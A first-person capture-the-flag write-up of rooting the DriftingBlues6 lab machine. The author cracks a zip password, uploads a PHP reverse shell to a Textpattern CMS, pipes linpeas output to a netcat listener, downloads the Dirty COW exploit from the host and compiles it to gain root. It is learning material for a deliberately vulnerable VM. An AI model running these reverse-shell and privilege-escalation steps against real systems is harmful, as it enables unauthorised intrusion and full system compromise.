[<- home](/)

# DriftingBlues6 [PG Play]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the target machine's IP address in a variable:

```
targ3t=192.168.106.219
```

Now let's scan the target with `nmap`:

```
nmap -A $targ3t -oN general.scan -vv
```

Only one port seems to be open and it's port `80`, so let's just start browsing immediately:

```
firefox $targ3t:80
```

The website is desperate because of all the hacking that happens to it. I noticed at the source code comment they also ask us to hack the perpetrators instead:

```
<--
please hack vvmlist.github.io instead
he and their army always hacking us -->
```

```
firefox vvmlist.github.io
```

This challenge aside, this is a very useful website, which I will definitely bookmark. 

Anyway, I don't see why I should hack a live website illegally, just because a virtual machine website told me to. So to get back to this challenge, let me put it through `gobuster` and see if there's something more to it:

```
gobuster dir -u $targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Before it ends it already yielded four paths at 5% scan. The paths are: `/index` which is homepage, `/db`, which seems to be the picture on the homepage,`/robots` which asks us to rerun gobuster with `.zip` extension pointer, which we will definitely do, and `/spammer`, which is a `.zip` file which `/robots` was probably referring to: `spammer.zip`.

I don't want to begin doing anything before I know I've got everything I could get. So I'll wait for gobuster to finish, I'll rerun one with `.zip`, I'll put this through `Dirsearch` and `feroxbuster` (going extra mile to avoid help from another write-up). 

The rest of the `gobuster` scan yielded only one additional path `/server-status` the status code of which was `403`.

```
gobuster dir -u $targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip
```

This returned nothing different from the previous scan, except it added `/spammer.zip` just like I expected. Maybe I typed something wrong and there's something more to this, but I have the same result.

```
dirsearch -u $target -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o dirsearch.scan --format=plain
```

`dirsearch` returned much of the same and the path mentioned in `/robots` or `robots.txt` file, which I thought nothing of (stupid). The path is `/textpattern` and it hosts quite a web page with a name `hakan tasiyan` who seems to be the author of the text on the webpage. There's also `RSS` and `Atom` links, which means this is probably a blog post. 

```
feroxbuster -u http://$targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

This has returned a lot of paths, mostly related to `/textpattern` most importantly `/textpattern/textpattern` mentioned in `robots.txt`, which is a login interface. There are also a lot of directory listings. 

We will get back to all of this, but first, let's download and examine `spammer.zip` archive.

```
wget https://$targ3t/spammer.zip
unzip spammer.zip
```

This zip is password-protected. Let's see if anything can brute-force it.

I did some google searches and installed `fcrackzip`, ran it, but it didn't work really. Then one of the search results popped up and I suddenly remembered `John the Ripper` had `zip2john` utility.

```
zip2john spammer.zip > zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt
```

The password for this zip file is `myspace4`:

```
unzip spammer.zip
cat creds.txt
```

The credentials for something seem to be `mayer:lionheart`

Let's try it as credentials to the login interface we have found at `/textpattern/textpattern`:

```
firefox http://$targ3t/textpattern/textpattern
```

It worked, we're in. There's a variety of things we can do here: post articles, manipulate website pages, upload files. I'm wondering if I can upload a php reverse shell here and send a request to it from the browser.

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Change the appropriate credentials, rename to `shell.php` and upload at:

```
firefox http://$targ3t/textpattern/textpattern/index.php?event=file
```

Now when I'm trying to run `nc -lvnp 1234` and navigate to the file from this interface it doesn't do anything. I'm wondering if I can send a request to this file from the browser. I'll check if it appeared in any of the directory listings, that `feroxbuster` has found.

```
firefox http://$targ3t/textpattern/images
firefox http://$targ3t/textpattern/publish
firefox http://$targ3t/textpattern/content
```

And many others didn't have the file we uploaded. So what I did was try

```
firefox http://$targ3t/textpattern/files/shell.php
```

And it worked! We got the shell. Let's upgrade it:

```
python3 -V
```

No `python3` here. 

```
python -V
```

Seems to be Python 2.7.3. Should work:

```
python -c "import pty; pty.spawn('/bin/bash')"
```

Now that we have upgraded the shell, let's find any ways to escalate our privileges:

```
ls /home
```

Nothing in the home folder indicates there are no other users but root on this machine. 

```
cat /etc/passwd
```

This seems to confirm my suspicion. Let's find binaries with SUID bits set:

```
find / -perm /4000 2>/dev/null
```

There's nothing that doesn't need Sudo, which we don't have on this user:

```
sudo -l
```

Let's try `linpeas.sh` and maybe find out what else we can use to escalate our privileges on the machine. 

```
cd /tmp
```

On our host machine, let's make the output listener ready:

```
nc -lvnp 9002 | tee linpeas.out
```

And on the remote machine, type the following:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | nc <HOST MACHINE IP> 9002
```

This will prepare a linpeas analysis right on your host machine in a file named `linpeas.out`.

```
cat linpeas.out | grep CVE | more
```

A `dirtycow` vulnerability (`CVE-2016-5195`) seems to be available on the remote machine and `gcc` utility is also available on the remote machine. This could be worth a try. Let's find a `dirtycow` exploit:

```
searchsploit --cve 2016-5195
cp /usr/share/exploitdb/exploits/linux/local/40839.c dirty.c
```

Now we need to transfer this `dirty.c` file to remote machine's `/tmp`. On the host machine:

```
python -m http.server
```

On the remote machine:

```
wget http://<HOST MACHINE IP>:8000/dirty.c
```

And compile it on the remote machine:

```
gcc -pthread dirty.c -o dirty -lcrypt
```

Then run it:

```
./dirty Password1
```

This creates a new user `firefart` with password `Password1`. Let's try to login as that user:

```
su firefart
```

Now that we are firefart, let's try to gain root shell:

```
su -
```

And we have root shell! Now let's get the flag at `/root`:

```
cd /root
cat proof.txt
```

And this, ladies and gentlemen is the first time I cracked a machine without help from metasploit or someone's write-up. Yes, it's categorized as an easy machine. Yes, it took me 4-5 hours to pwn it, but I did it and never once have I looked inside a walkthrough or a write-up! Cheers:

```
                                       @                                        
                                       @                                        
                 @@                    @                                        
                  @@@                  @                                        
                    @@@                @                   @@                   
                      @@               @                 @@@                    
                        @@             @               @@@                      
                                                     @@@                        
                                                                                
                                                                                
                                                                                
                 @@@@@                                                          
                 @     @@@@@@@@                                                 
                @@              @@@@@@@                                         
               @@                     @@               @@@@@@                   
               @                      @@      @@@@@@@@@     @@                  
              @@                      @@@@@@@@               @@                 
             @@                       @@                     @@                 
             @@==                     @@                      @@                
             @---========-           @@@                       @                
            @@-------------========  @@@@                      @@               
            @@----------------------=@@@@                   ====@               
            @-----------------------%@ @@          -=======-----@@              
           @@-----------------------@@  @  ========-------------:@              
           @@-----------------------@   @@=----------------------@@             
           @@---------  -----------@@   @@-----------.  ---------@@             
           @@--------.   ----------@     @:----------   :---------@             
           @@---------------------@@     @@-----------------------@             
           @@--------------------@@       @:----------------------@@            
           @@--------------------@@       @@----------------------@@            
           @@------ .-----------@@         @@--------. .---  -----@@            
           @@---------  -------@@          %@-------------- ------@@            
           -@-----------------@@            @@--------------------@@            
            @@-----  --------@@              @@---------..--------@@            
            @@--------------@@                @@--------:.--------@@            
             @@------------@@                  @@-----------------@             
              @@---------@@                     @@---------------@@             
              @@@@ ---@@@@                       @@-------..-----@              
              @@==@@@@%@@                         @@@-----..----@@              
               @@====@@                             @@:--------@@               
               @@===@@                               @@@@*--%@@@@               
               @===@@                                  @@=@@===@@               
              @@===@@                                   @@=====@                
              @@. =@                                      @+===@                
              @= =@@                                      @@===@@               
             @@= =@@                                       @*.=@@               
             @@.=-@                                        @@=.=@@              
             @= =@@                                         @= =@@              
            @@= =@@                                         @@ .=@              
            @@ =@@                                          @@= =@@             
           @@= =@@                                           @@ =%@             
           @@=.=@                                            @@= =@@            
           @-==@@                                             @= =@@            
        @@@@===@@                                             @@. =@            
 @@@@@@@========@@                                            @@=.=@@           
@@@@@@@@=========-@@@                                          @@===@           
        @@@@@@@@@===@@@                                        @@===*@@@@@      
                 @@@@@@@@                                    @@@===========@@@@@
                                                          @@@@=======@@@@@@@@@  
                                                        @@@==@@@@@@@@           
                                                       @@@@@@                   
```
